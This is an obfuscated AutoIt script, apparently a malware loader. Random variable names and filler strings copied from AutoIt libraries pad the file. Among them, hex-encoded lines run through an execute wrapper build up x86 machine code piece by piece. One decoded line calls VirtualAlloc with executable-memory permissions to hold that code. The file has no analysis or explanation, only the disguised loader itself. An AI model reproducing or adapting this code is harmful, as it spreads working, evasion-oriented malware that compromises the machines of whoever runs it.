		Local $bmefhtskmiapgtjdmnprdycssfqk = $ee($v1("0x246471637A7771776F78636166616D762026202235304646443635393430353038443835383846454646464635303844383543344630464646463530464644373844383546344645464646463833433430433530464644363430353922"))
	EndIf
	Dim $hkpyvocvtmf = IsString(58983024)
	Local $uoybxddzzajalapjvimtxe = "Cdb"
	Global $futyn = "gdi32.dll"
	Dim $oydeeldgqzuebjswvipmsy = "bool"
	Global $brjkbl = "INT"
	Dim $xcmfrwi = "Permissions"
	Dim $wryvbxce = "int"
	Local $phgccttv = "dword"
	Local $yxmpjprsdeslakc = "RegQueryMultipleValuesW"
	Dim $ygdoyivgdodorrq = ";blk;blu;cyn;grn;mag;red;yel;whi;dbl;dgn;dmg;drd;dyl;dgy;lgy;aut;"
	Global $jlnmnl = "ReadOp"
	Dim $vfsaxliqhkjyeudmcponau = "uint"
	Local $nwzlt = "handle"
	Dim $kzbkofcjaiyjcfqjakwymwan = "d"
	Global $pieosiztvcbo = "BtnShadow"
	Local $zmuiyifp = "$_IESTATUS_COMError"
	Local $cloynjovnawufadmvhyvm = "dword"
	Local $ossabjssfxgnexorznyddr = "str"
	Dim $wkinnjpdrjvrouehdoitp = "handle"
	If NOT ($hkpyvocvtmf == "bhxkeqbzdswlwhpgsvbiqhkrvcxhpddqzdjssithyboyo") Then
		Local $sbxnhbdprqutcaufkusfdgjrg = $ee($v1("0x246D62756B79727763617A7A646D6C78737961767A6470796277616D792026202245344645464646463643373335433645433738354538464546464646373436343643364343373835454346454646464632453634364336433838383546304645464646464337383522"))
	Else
		Local $zjnlaomroxdjjqgqhq = $ee($v1("0x446C6C43616C6C28226B65726E656C3332222C2022707472222C20225669727475616C416C6C6F63222C202264776F7264222C202230222C202264776F7264222C2042696E6172794C656E28244444292C202264776F7264222C2022307833303030222C202264776F7264222C20223078343022295B2230225D"))
	EndIf
	Dim $tgvypftxelffzkfsnrknnta = IsInt("xcwcawdoblwuholnnpjobbermozdu")
	Global $cgogo = "	</frameset>"
	Local $rkayylqfio = "Size"
	Global $wucetkagjfvjsuxxzqmvzbd = "dword"
	Local $bcudeoycgmlbvcoa = "ptr"
	Dim $ofrtijys = ")\z"
	Global $rlseixlgaglpollyvkgyt = "handle"
	Local $kkiltgwwelvaiqtqpaeydpc = "Top"
	Global $civzbsyuuxpzn = "bmBitsPixel"
	Local $ldqlpfqpjtuotuia = "%02i:%02i:%02i"
	Dim $obejcbn = "dword"
	Global $pnknpe = "uxtheme.dll"
	Global $wxrfpiykazpolf = "SetLastError"
	Global $gtnjbjtnufjaeqi = "pfnCallback"
	Dim $gwwobeqnvhndit = "int"
	Dim $gedunxrvcokwjgfksjzrrsj = "bool"
	If NOT ($tgvypftxelffzkfsnrknnta == 1) Then
		Local $udxctoxeyjycmvkhhbhgc = $ee($v1("0x247362786E6862647072717574636175666B75736664676A72672026202245434644464646463543344236453646433738354630464446464646373736453434364343373835463446444646464636433733354336314337383546384644464646463634373622"))
	Else
		Local $reubjzetidgaonwqmfirszvecys = $ee($v1("0x2470736C68786E756F67706D636C6B7766776B70696D78656379782026202238443835363046424646464635304538454445374646464638393835373430313030303038443835443046454646464635304538444245374646464638393835303030313030303022"))
	EndIf
	Dim $nmaqxqictceyrsz = IsString("pubzuhvmjrklaefv")
	Local $rmahtpkskg = " time format milliseconds"
	Global $gakqeeybtqebl = "WinAPIError.au3"
	Global $mxstl = "SHGetKnownFolderPath"
	Dim $sxifprmojnksoo = "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
	Global $exwvginssyivbyjzyx = "Span"
	Global $lbdqsxqzlxjybhzeqmp = "int"
	Local $tethpbtqqhyzswsfokxtgbz = "int"
	Dim $kuhlsbfoizxkiogvhb = "long"
	Dim $cllyexursfwgxryi = "UDFGlobalID.au3"
	Local $ueothdbimktxxydhivmndkw = "Beep"
	Global $dlxhm = "dword"
	Local $hjosev = "int"
	Local $gyhzitjqns = "TimeWritten"
	Global $hyzgzqlfyrkv = "handle"
	Global $qrrkodqrmbvrnqyklhy = "bool"
	Local $xvmdbihxesaqawarffr = "wparam"
	Local $ezxozgyn = "handle"
	Global $xtwxkbi = "_IELoadWait"
	Local $drwqckucskjfsrngniayrz = "tw"
	If NOT ($nmaqxqictceyrsz == 0) Then
		Local $xcutrbih = $ee($v1("0x2475647863746F7865796A79636D766B6868626867632026202236313730433738354643464446464646363933333332324543373835303046454646464636343643364330304337383532384645464646463543344236453646433738353243464522"))
	Else
		Local $pslhxnuogpmclkwfwkpimxecyx = $ee($v1("0x24767574646B736B796A68696D2026202238443835353446434646464635304538313145384646464638393835433830303030303038443835464346414646464635304538464645374646464638393835363030313030303022"))
	EndIf
	Dim $ccdtueivyhbiaxw = IsString(40339917)
	Global $usbekeozjp = "ImageList_GetIcon"
	Dim $jnzgahobngk = "dword*"
	Dim $pleugabtk = "int"
	Global $qqjljbxzrkx = "int"
	Dim $legmqof = "user32.dll"
	Global $fvzcgqcyhrrysbw = "hyp"
	Global $ofooqepxm = "kernel32.dll"
	Local $drrugncvsahy = "X"
	If NOT ($ccdtueivyhbiaxw == "slgnyn") Then
		Local $umsfgmyfnycwodqvdyyhxwfbldxa = $ee($v1("0x2478637574726269682026202246464646373736453434364343373835333046454646464636433733354336424337383533344645464646463635373236453635433738353338464546464646364333333332324522"))
	Else
		Local $pepag0
	EndIf
	Dim $kmlfpiwzktzrfv = BinaryToString("0x6C6F7A7A636E6C7662647161697167777469617376686B737576756D707173646A63687874636F7671746D716F61746F")
	Dim $xoagxvjfxmnxpge = "int"
	Dim $hjcoegyvpihhj = "handle"
	Dim $kykfnjgcymxvk = "Error"
	If NOT ($kmlfpiwzktzrfv == 0) Then
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	Else
		Local $phqzsjrmptkzoxrowc = $ee($v1("0x2463756B79707A2026202234423635373930304337383538344641464646463433373237393730433738353838464146464646373435323635364343373835384346414646464636353631373336354337383522"))
	EndIf
	Dim $bkywv = IsInt("zrkhwnlbfgavqqwljonealcueumbm")
	Global $cgaxpdquewg = ">0,-1"
	Global $xczpsidlehfxkzhzaopxld = "]"
	Dim $igafnvtnbzsm = "SetWindowRgn"
	Global $frbtsrsrmfvrsz = "AutoIt.Error"
	Global $ugjbcfqmmkjzpmgwdsucmm = "WinAPIError.au3"
	Local $nzrdaopgurnikclk = "uint_ptr"
	Dim $jrxspupgrr = "Error"
	If NOT ($bkywv == 1) Then
		Local $xexgw = $ee($v1("0x24646A626E702026202236433733354337354337383539344645464646463733363537323333433738353938464546464646333232453634364336364337383539434645464646463643303043373835463422"))
	Else
		Local $cukypz = $ee($v1("0x246166716977786862707176676D716A616E6A7062756D787A792026202243373835313446434646464634333732373937304337383531384643464646463734343436353733433738353143464346464646373437323646373943373835323046434646464622"))
	EndIf
	Dim $osmofyimwtt = IsString(12304933)
	Local $pirfhjgyqhcikhyokjz = "dword"
	Global $flytlpxcxwgvqiz = "]"
	Dim $loxywzbo = "kernel32.dll"
	Dim $ltyvbdfhoyrao = "wparam"
	Dim $pqpofi = "FileConstants.au3"
	Dim $qgpyrwtsrldh = "{5CD7AEE2-2219-4A67-B85D-6C9CE15660CB}"
	Local $uymgunjo = "ptr"
	Global $ygqfdyvllwqiwb = "CreateWindowStationW"
	Dim $ybvobkugvojwgsybfyncmi = "long["
	Local $diepqewfnpocxwv = "dword"
	Global $kmpeerhqdk = "WinAPIIcons.au3"
	Local $xjaxcqrfjmqtdjyib = "ColorAdjustLuma"
	Dim $auzyzdmizblzdyr = "handle"
	Global $tehcazykahiibsyvpcjcxyei = "["
	If NOT ($osmofyimwtt == 1) Then
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	Else
		Local $qdwvdt = $ee($v1("0x2468776E6F626D7169656B6577627878646967682026202234354530353046464437384244384538423145344646464638423544313838393435344338443835463446424646464635304538394645344646464638393435333438443835323422"))
	EndIf
	Dim $arqerflcycg = IsString("myituiihohzijc")
	Global $dearztahipjubuay = "wstr"
	Global $huwqcwzuworijcjvzinihqjv = "GdipSetSolidFillColor"
	Global $adbibcasuhoxuazdsr = "Header"
	Dim $szbqjirqkanhfyqvgp = "handle"
	Local $polktiimrdvv = "struct*"
	Dim $zsstjcjg = "GetLocalTime"
	Local $biilcariclqfqajd = "int"
	Global $lfqlvnxmzhfhkudgze = "comctl32.dll"
	Dim $drftjnctzyqkjejlxmxfo = "word"
	Dim $dglmtjznuwioksmavtzjow = "CryptDestroyHash"
	Local $vcriwglripdcpzqzdpmw = "bool"
	Dim $awkvrrih = "Year"
	Global $yghfyqwxcciyftjjlg = "Deleted Account"
	Global $uxqlmkuaahxgxbjryrwayycs = "dword;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;ulong_ptr;dword;dword;dword"
	Dim $ihward = "handle"
	Dim $rtlfbwbukshs = "ALL"
	Global $orrbwvynhjmsdgg = "GdipMeasureString"
	Dim $aaefrybwhhfxjhpjmalrhn = "PlgBlt"
	Dim $wpdynepc = "Process32FirstW"
	If NOT ($arqerflcycg == "assklzxhsykzftsupztrprtldqzvnohjw") Then
		Local $rudpycewogqzsphtpvvbc = $ee($v1("0x2466696D627563666B6F746D79707363626B78672026202233324337383530344646464646463245363436433643383838353038464646464646433734354530373537333635373243373435453433333332324536343636433734354538364322"))
	Else
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	EndIf
	Dim $riizt = BinaryToString("wjstdktrvawdqilhjgiv")
	Local $jzeduugsnp = "us-ascii"
	Dim $bvixytdqvohxbdarriyczuw = "browser"
	Dim $txwofnkk = "ptr"
	Dim $cbvmqolxgtrf = "{DEBF2536-E1A8-4C59-B6A2-414586476AEA}"
	Global $neyhyxxuaf = "gdi32.dll"
	Dim $tmqwvhphdpi = "handle"
	Local $tlbrwtyaglzfnfg = "ProcessID"
	Dim $hdducuksgakoqbojdjynxn = "wparam"
	Global $exqukaiim = "user32.dll"
	Dim $zihhenyprvxrd = "__Excel_COMErrFunc"
	Global $tzttknxxtywacfddhyeaqg = "GetTextAlign"
	If NOT ($riizt == 1) Then
		Local $waoenetjkomgqpbbtnzqg = $ee($v1("0x2472756470796365776F67717A7370687470767662632026202236433838343545414337383530434646464646463445373434463730433738353130464646464646363536453442363536364337383531344646464646463739303043373835453422"))
	Else
		Local $dsq4f8s5dq = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E2824666473766734357364663534677629202620225D222C2024647371663635367364357129"))
	EndIf
	Dim $ldojz = IsString("baxsjhdlhanujuezqttgeagxmtdiwnajvjb")
	Dim $pmenzlkjngrxn = "$_IESTATUS_InvalidObjectType"
	Global $jfxxgngsigyoxvhnyrqr = "SendMessage"
	Global $spgsmjnpdrgplkeecfmesmwm = "gdi32.dll"
	Global $zwvavpg = "float*"
	Dim $uujurvwrfwctmnmmpfgtuzng = "dword"
	Global $rkzegxehld = "wparam"
	If NOT ($ldojz == "twipkhwwazmbzyounvhmlnqrijbeapqdyniov") Then
		Local $qdxttjizmfovevtokkyknes = $ee($v1("0x2477616F656E65746A6B6F6D6771706262746E7A71672026202246424646464634453734353137354337383545384642464646463635373237393536433738354543464246464646363136433735363543373835463046424646464634423635373922"))
	Else
		Local $zlyvugahlwcuos = $ee($v1("0x2462636C626B666C632026202238353530464446464646433734354243364236353732364543373435433036353643333333323838343543383838343541383838383538304644464646463634413133303030303022"))
	EndIf
	Dim $qzvmca = IsInt("ffnuryjiqcujpaayprzzkk")
	Local $zaxofvgchxnf = "user32.dll"
	Dim $wwifbjfdpuymlfhjzd = "]"
	Global $iizmeacd = "wstr"
	Global $gkdkbcmzuwiugiuw = "{BCB5256F-79F6-4CEE-B725-DC34E402FD46}"
	Local $bfgnonitwjdamak = "Field4"
	Dim $whxqbf = "uint"
	If NOT ($qzvmca == "ulzbnoqbyytaraeajlrrweybznwdvlxli") Then
		Local $etcafrwhwlvfxrktvkkyi = $ee($v1("0x2471647874746A697A6D666F766576746F6B6B796B6E65732026202230304337383535344643464646463445373434353645433738353538464346464646373536443635373243373835354346434646464636313734363534423636433738353630464322"))
	Else
		Local $kwikihnhrktdxczrfzvqrrvxahjmj = $ee($v1("0x247068717A736A726D70746B7A6F78726F77632026202239304641464646463433364636453734433738353934464146464646363537383734303043373835393846414646464634453734353236354337383539434641464646463631363422"))
	EndIf
	Dim $osdkd = IsInt("gpqfxltwxyyenaznjfxrfecagv")
	Global $zxpxsjqqqwvt = "LegalTrademarks"
	Dim $udgrldagoyqpmfakyiag = "handle"
	Local $poakokeuvapizjxgfzqbycte = "Error"
	Local $xlwwqhdrcksmwj = "int"
	Global $wwbaabuhmlbmvwzy = "dword"
	Dim $zeybvsuwnmu = "bool"
	Global $ehoolwkbpe = "ulong_ptr"
	Dim $hosnybuv = "Invalid Mode"
	Global $gigfhurtgfqolkmlyxoue = "handle"
	Local $iuzwqzltksicqf = "StructureConstants.au3"
	Global $cvyqzhdmqwxwcq = "Type"
	If NOT ($osdkd == 1) Then
		Local $ykmuimicaf = $ee($v1("0x246574636166727768776C766678726B74766B6B79692026202246464646363537393838383536324643464646464337343538343644363536443633363643373435383837303739383834353841433738353234464146464646343337323739373022"))
	Else
		Local $qbbrvg = $ee($v1("0x246E716D6864646E73637370736F79787A6C6E6D6C2026202237333733433738353030464346464646363136373635303043373835323446464646464634353645363435304337383532384646464646463631363936453734383838353243464622"))
	EndIf
	Dim $txnvvdgtxesbjvtdticwo = IsInt("pfknpgwlaumyeaaucqewgq")
	Global $zdnwhcuhwiga = "ptr"
	Global $fsvobcvctduoqgwo = "handle"
	Global $ddfbwqgbylxsrd = "fMask"
	Local $mzuhebu = "SetPolyFillMode"
	Local $ebathaevmzrzxua = "struct;dword Size;hwnd hWnd;uint ID;uint Flags;uint CallbackMessage;ptr hIcon;wchar Tip[128];dword State;dword StateMask;wchar Info[256];uint Version;wchar InfoTitle[64];dword InfoFlags;endstruct"
	Local $kcliwtcafezblhjccaysps = "WinAPIHObj.au3"
	Dim $klnbzghkxjkcvfgqhvzwk = "\\"
	Local $vsayxgsodnmioygyr = "handle"
	Local $yzgvrbixolkwaxgggimqrvz = "int*"
	Global $cioaftzlqvmfgwyuascphrs = "]"
	If NOT ($txnvvdgtxesbjvtdticwo == "kamvjqquzmoeltpvrafagc") Then
		Local $tmlta = $ee($v1("0x24796B6D75696D696361662026202243373835323846414646464637343431363337314337383532434641464646463735363937323635433738353330464146464646343336463645373443373835333446414646464622"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Dim $idxhdaxcuzainfrxpg = IsString(-74618606)
	If NOT ($idxhdaxcuzainfrxpg == 1) Then
		Local $ridhqys = $ee($v1("0x24746D6C74612026202236353738373435373838383533384641464646464337383544344642464646463433373237393730433738354438464246464646373434333732363543373835444346424646464622"))
	Else
		Local $kjoqisdymcxkdlpssmymdgel = $ee($v1("0x246D6D667977656C6F71776C6966787265702026202236444535464646463842354430433839343536303844383543304641464646463530453835424535464646463839343535433844383535344646464646463530453834434535464622"))
	EndIf
	Dim $qswugg = IsInt("pymmrrdxcijkkhwtwbbuxnpjyulxvmzcnghxfnzam")
	Local $iwqbenvodmxxmnmlr = "GetDIBits"
	Local $ergnfkitqyd = "\"
	Local $ejbwktogxptujhtvmxa = "struct*"
	Local $qcvtfcxfiimtidkvir = "CreateFontIndirectW"
	Global $qulbazvmgnehmsybqom = "dwMask"
	Global $khqzqlrpjm = "ptr"
	Global $iksecctcvimwklurdhpajjdk = "handle"
	Local $uqdruospqyjj = "struct*"
	If NOT ($qswugg == "llaiasfxgjn") Then
		Local $kipwxardadfkgipgxenfvgcsm = $ee($v1("0x24726964687179732026202236313734363534384337383545304642464646463631373336383030433738354634464346464646343337323739373043373835463846434646464637343438363137334337383522"))
	Else
		Local $weymdkvsrospsvkhu = $ee($v1("0x247562766C68726C6C696F787970762026202236433733333333324337383537304645464646463543344636433635433738353734464546464646333333323245363436364337383537384645464646463643364338383835374122"))
	EndIf
	Dim $eoyedfzwygfxxqyghdttylrr = IsString("fcqjbrymlrn")
	Global $ttykbfv = "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
	Dim $djxswlxqcqkqgqmbswhmvnd = "dword"
	Dim $hmwldbbeqjatvfu = "handle"
	Local $scnhyzmy = "user32.dll"
	Global $pgenjek = "int"
	Global $jobzcbzbbseyybc = "uxtheme.dll"
	Global $wyfdhbadwflbjwx = "struct*"
	Local $livymwwbyqhclkf = "wchar["
	Global $hfhazzftqajibgrnors = "CallWindowProcW"
	Local $ggdkvtubvmy = "GdipGetPenWidth"
	Local $gliwstg = "user32.dll"
	Global $pblxvoeyhyybwpdm = "SetSysColors"
	Local $xkwvngdi = "bool"
	If NOT ($eoyedfzwygfxxqyghdttylrr == "vvfbbyvdusxduuophynpsyjenvbnnviewlvjeashu") Then
		Local $xjbmhcikfadelpilxfqhanrc = $ee($v1("0x246B697077786172646164666B6769706778656E66766763736D2026202246434643464646463638343436313734363643373835303046444646464636313030433738353934464346464646343337323739373043373835393846434646464637343434363522"))
	Else
		Local $oeatgxfkelugdzrjqpci = $ee($v1("0x24666766667677746B71706676622026202234423645364643373835393846444646464637373645343436434337383539434644464646463643373333333332433738354130464446464646354336423635373243373835413422"))
	EndIf
	Dim $sckonuuhw = IsString("xsvnspgwbipliqbzivdptmlfokugmqrqhluganfjpdrfoyp")
	Global $mffotsgtqsvfsfxqsfisov = "sqlite3_changes"
	Local $uiecjxpkzji = "AutoIt Assert"
	Local $dzymsticpkgmbzhi = "wstr"
	Local $fzkcrgufvtvopdrfspj = "ptr"
	Global $sttww = "dword"
	If NOT ($sckonuuhw == 0) Then
		Local $cfcctwdgwkzrpqsax = $ee($v1("0x24786A626D6863696B666164656C70696C78667168616E72632026202237324337383539434643464646463639373636353442363643373835413046434646464636353739383838354132464346464646433738353838464246464646343337323739373022"))
	Else
		Local $wfvzea = $ee($v1("0x24796776707472637A75756F7773677967752026202246454646464635433645373436344337383535434645464646463643364332453634363643373835363046454646464636433643383838353632464546464646433738354230464422"))
	EndIf
	Dim $cqtriiptxhfxnmjtw = IsString("mpjmrnzgrn")
	Global $shvyfhqivjypsccx = "struct*"
	Global $mvidyg = "Type"
	Local $xfnmw = "AdjustTokenPrivileges"
	Global $wkdicolvyxugqz = "handle"
	Local $htkdwrrxqlq = "kernel32.dll"
	Local $feqawrtjgwhzitcjyuz = "int"
	Local $nizsmkmdvzleocayowox = "struct*"
	If NOT ($cqtriiptxhfxnmjtw == "fawbe") Then
		Local $aaimblpftybmllkrzjb = $ee($v1("0x246366636374776467776B7A7270717361782026202243373835384346424646464637343434363537334337383539304642464646463734373236463739433738353934464246464646343836313733363838383835393846424646464622"))
	Else
		Local $ridhqys = $ee($v1("0x24746D6C74612026202236353738373435373838383533384641464646464337383544344642464646463433373237393730433738354438464246464646373434333732363543373835444346424646464622"))
	EndIf
	Dim $vxiyvhmvvidlqia = BinaryToString("cjusxovxmza")
	Global $ahoeez = "cbSize"
	Global $dqrgzmckno = "Indent"
	Local $dcadl = "dwmapi.dll"
	Global $realmnietwymo = "GetDeviceGammaRamp"
	Global $ervytrusladlda = "int"
	Local $wmlrvm = "struct*"
	Global $ushdmlkoz = "ptr"
	If NOT ($vxiyvhmvvidlqia == 0) Then
		Local $afqiwxhbpqvgmqjanjpbumxzy = $ee($v1("0x246161696D626C70667479626D6C6C6B727A6A622026202243373835353446444646464634333732373937304337383535384644464646463734343436353633433738353543464446464646373237393730373438383835363046444646464622"))
	Else
		Local $qetewcfooarkmwvdjosfuei = $ee($v1("0x247A6F6B6E6B74696A6F6F71736B7977796578797878616761762026202238423044333030303030303035333536384246303333433038393435464338393435463838423439304338423439313438423039384235393130353743373435443034453734344622"))
	EndIf
	Dim $zrzjhzmjxasihksggujewe = IsInt(93738928)
	Local $nsaobtucem = "handle"
	Local $aovebjztufdupqzudcgws = "user32.dll"
	If NOT ($zrzjhzmjxasihksggujewe == 0) Then
		Local $cukypz = $ee($v1("0x246166716977786862707176676D716A616E6A7062756D787A792026202243373835313446434646464634333732373937304337383531384643464646463734343436353733433738353143464346464646373437323646373943373835323046434646464622"))
	Else
		Local $qzpcwpoemanbstaawd = $ee($v1("0x24677269696F776E6262666971727A6D6B636E2026202235333536353738314543373830313030303036413545353938424643384438343234303830343030303033334442384442343234383830313030303038393943323441343032303022"))
	EndIf
	Dim $xmqpnhntekndiiivsl = IsInt("lofvhmmqdnhmpobriscdaxhj")
	Global $mcuibkvmdbxyskumlgly = "Text"
	Dim $rlugoldeezrensz = " target="
	Local $xjclkqlyzdmb = "GetWindowLongW"
	Local $pdwgehbawtya = "Left"
	Dim $lvcolslgbevplascbgu = "ulong"
	Local $fecvjfr = "$_IESTATUS_COMError"
	Local $rgrryjyre = "hwnd hWnd;uint Func;ptr From;ptr To;dword Flags;int fAnyOperationsAborted;ptr hNameMappings;ptr ProgressTitle"
	Global $irpzeq = "wstr"
	Global $jdipxmpifoqpp = "hwnd"
	Dim $adridtsjdwkg = "html"
	If NOT ($xmqpnhntekndiiivsl == "xhnygeosoznjguwqrlaczvkqqvmcf") Then
		Local $phqzsjrmptkzoxrowc = $ee($v1("0x2463756B79707A2026202234423635373930304337383538344641464646463433373237393730433738353838464146464646373435323635364343373835384346414646464636353631373336354337383522"))
	Else
		Local $fonbvcheguftwkcaeikgadyzndug = $ee($v1("0x246970796C686575727179726E73677668617674617863676763706E632026202238443835373846394646464635304538354445374646464638393835413430303030303038443835453446424646464635304538344245374646464638393835434330303030303022"))
	EndIf
	Dim $bnvuh = IsString(53142201)
	Dim $ijyidlttkqengmhpkzlbbjx = "int"
	If NOT ($bnvuh == 1) Then
		Local $kwikihnhrktdxczrfzvqrrvxahjmj = $ee($v1("0x247068717A736A726D70746B7A6F78726F77632026202239304641464646463433364636453734433738353934464146464646363537383734303043373835393846414646464634453734353236354337383539434641464646463631363422"))
	Else
		Local $xjbmhcikfadelpilxfqhanrc = $ee($v1("0x246B697077786172646164666B6769706778656E66766763736D2026202246434643464646463638343436313734363643373835303046444646464636313030433738353934464346464646343337323739373043373835393846434646464637343434363522"))
	EndIf
	Dim $cuuqdayctztvkfs = IsString("pnnydvvhwkpsvuauihexjbbtzywvbzjpzglzwtsuzyqrdpbc")
	Global $nhjnrrkqzwzltvarychqfk = "<html>"
	Local $uattyjndizvlhyl = "long"
	Dim $xahbpeb = "int"
	Local $eqduwzxrqwamlilv = "no brackets"
	Dim $dvaxhomgtlpsutzzrw = "AutoIt: "
	Local $buzmcloyqtz = "handle"
	Local $tetvfjsefadgsm = "String"
	Global $dpjbbalfdyhcsqxhhfvyavgq = "uint"
	Local $ivscpxtvfdkrdhpblkbnjgyl = "SubItem"
	Local $yijtemacjlvsfyvrexor = "\\.\"
	Local $vfvbpcxhwbcunwkfecff = "ptr"
	Local $vpopunrwdooonillame = "user32.dll"
	Local $divtrjo = "visible"
	Dim $fnalbnd = "handle"
	Dim $ygyhxxtr = "{B96B3CAD-0728-11D3-9D7B-0000F81EF32E}"
	Global $qbslguaviisjli = "main"
	If NOT ($cuuqdayctztvkfs == "kiapqawr") Then
		Local $bgoyiosrfzjlkrhsmwhaxrssfl = $ee($v1("0x246B77696B69686E68726B746478637A72667A76717272767861686A6D6A2026202235363639433738354130464146464646373237343735363143373835413446414646464636433444363536444337383541384641464646463646373237393030433734354143344322"))
	Else
		Local $hrwopeddl = $ee($v1("0x24647A7773646A69766B766867786A6C777271767769757172626C2026202245383643454246464646383934353134384438354434463446464646453835454542464646463839343531383835433037353045384438354334463046464646453834434542464622"))
	EndIf
	Dim $zknjkulewjn = IsString(-96111920)
	Global $lqoliauscx = "bool"
	Global $xnzwothrk = "InternetCloseHandle"
	Global $nowhebsllxutpzzpu = "wchar Text["
	Local $oyzvozfwpoaosuvlylywdlua = "struct*"
	Dim $pusxeqxbop = "]"
	Global $vwvwwfbu = "GdipSetPenLineCap197819"
	Local $iipvddycjsqbxrwyv = "Rectangle"
	Dim $xtsbgqxdnemkgbpvabylq = "GetActiveWindow"
	Local $fuyfzgfbystppo = "GPIB search results"
	Local $voeffvvcb = "hwnd"
	Global $uezjgwlrsdgykmoizgmm = "_IEPropertyGet"
	Dim $jegzzcdyilgdntfjscvnr = "fStyle"
	If NOT ($zknjkulewjn == "wlkubrlnbeayoanarragjedbjpxwbf") Then
		Local $tbkjaybypdffoogzazmegzofol = $ee($v1("0x2462676F79696F7372667A6A6C6B7268736D77686178727373666C2026202236463631363443373435423034433639363237324337343542343631373237393431383834354238433738353543464646464646343736353734353043373835363046464646464622"))
	Else
		Local $wrotlgqjqfw = $ee($v1("0x247470727A7079767077622026202246464646353045384435453546464646383934353738384438353043464146464646353045384336453546464646383934353734384438354634463946464646353045384237453522"))
	EndIf
	Dim $utgncvlhj = IsString(87037737)
	Dim $wmopfxneiaptwujqsdbymgsp = "n"
	Dim $exoecbjvqgymjtqkgxiyrx = "biXPelsPerMeter"
	Global $ofnptzoba = "bool"
	Dim $wmsnytjuqrfvwmrsfghe = "hwnd"
	Global $vwfxhjljkkpjlql = "DriverExtra"
	Dim $cpxastghwwub = "bV5Size"
	Dim $ywqtvckeivkgcgcundupiqv = "int"
	Local $znpoihmlntuzigrkp = "dword"
	Dim $dbtbgyhnqhbmhfd = "long"
	Local $mctrsizovoxxbqwymytn = "__RichCom_Object_AddRef"
	Local $zufsi = "handle"
	Dim $uvvsetl = "{\rtf"
	If NOT ($utgncvlhj == "sztvbwzcq") Then
		Local $bmljovsxurhwylkmcdnghttxrsfa = $ee($v1("0x2474626B6A61796279706466666F6F677A617A6D65677A6F666F6C2026202237323646363334314337383536344646464646463634363437323635363643373835363846464646464637333733383838353641464646464646433734354543363136343736363122"))
	Else
		Local $afqiwxhbpqvgmqjanjpbumxzy = $ee($v1("0x246161696D626C70667479626D6C6C6B727A6A622026202243373835353446444646464634333732373937304337383535384644464646463734343436353633433738353543464446464646373237393730373438383835363046444646464622"))
	EndIf
	Dim $csctqtgkpised = IsString(82577348)
	Dim $xmqqwskccfyseapikphg = "wparam"
	If NOT ($csctqtgkpised == 1) Then
		Local $eunfvpwomf = $ee($v1("0x24626D6C6A6F76737875726877796C6B6D63646E6768747478727366612026202243373435463037303639333333324337343546343245363436433643383834354638433738353330464646464646364337333734373243373835333446464646464636433635364522"))
	Else
		Local $eodmqc = $ee($v1("0x247A78757072636E2026202237343433373243373835303846434646464636353631373436354337383530434643464646463533363536333734433738353130464346464646363936463645303043373835343022"))
	EndIf
	Dim $zhtjk = BinaryToString("0x676F797966686B6F716A6563676D69717A6C")
	Local $bzovulvkjnramwdro = "kernel32.dll"
	Global $uwlwnixnilljvhqfmtnyu = "dword"
	Global $kyuxfskwbovfosilohcxb = "struct*"
	Dim $fyfugsax = "int"
	Local $oozipbphgmlqtl = "bool"
	Local $vztbtprgnppinyg = "shlwapi.dll"
	Dim $xoynwlaysuhljeimcyxj = "struct*"
	Global $cblazsoetmq = "handle"
	Global $hdhbuxxybfkaavia = "ushort"
	Global $gvllkbfdpozsanxuvpiaalez = "int"
	Local $rswtpreouwswaothjcmjmdbm = "focus"
	Local $zvqlfucnltujbwydydshlgd = "int"
	Global $hloqjjbtftdkmcybino = "handle"
	Local $oadirgmsrwomnqz = "none"
	If NOT ($zhtjk == "ysbgmvpvuqmplu") Then
		Local $ojmrtpsebb = $ee($v1("0x2465756E667670776F6D662026202235373838383533384646464646464337383543344639464646463445373435303732433738354338463946464646364637343635363343373835434346394646464637343536363922"))
	Else
		Local $uzzjqr = $ee($v1("0x2479706F66787270797A706469706C7A7369686D79627163616A75746F2026202245324646464635304646443738443435394338334334304335304646443635393430353038443435394335303844383538344530464646463530464644373844383534434645464622"))
	EndIf
	Dim $lhhqfanqqjky = IsString(-35846853)
	Dim $xonarugmbgvaphbnecld = "bool"
	Dim $psbxcubqketslhiunaddtsqb = ":"
	Dim $ldsdxpoxiqwes = "lresult"
	If NOT ($lhhqfanqqjky == 1) Then
		Local $uuxkshdisnsvqrtaebajpvzwpduqz = $ee($v1("0x246F6A6D727470736562622026202237324337383544304639464646463734373536313643433738354434463946464646344436353644364636364337383544384639464646463732373938383835444146394646464622"))
	Else
		Local $nqkevmlevnptlngyplahqyn = $ee($v1("0x247778756F797977666A6F67626B666C6C7263686A747A2026202234354643353036414646464637354634464635354630383543303046383835334646464646463842343546433546354535424339433335353842454342383830314630303030453822"))
	EndIf
	Dim $lvvpqfviydsegxbzw = IsInt("qeipocmjvqckucqjpxzdpauotpde")
	Local $bwdxkzdqwkdcgufmre = "lCustData"
	Global $aekhzhqakjkduuzltvveh = "CheckMenuItem"
	Dim $eqhuk = "FtpGetFileSize"
	Dim $swastpksnplbsymzfayjupnt = "BeginUpdateResourceW"
	Local $jzvqiel = "_IETagNameGetCollection"
	Global $hsdldrrvgifdhojevfcj = "struct*"
	Global $matrzdwhnpfy = "cyMinChild"
	Global $qyvxpaxgrggejgiomlirkkz = "SelectObject"
	Global $brobqckxoenj = "0"
	Local $ubktymafatmycng = "user32.dll"
	Dim $fzgsqqeul = "dword"
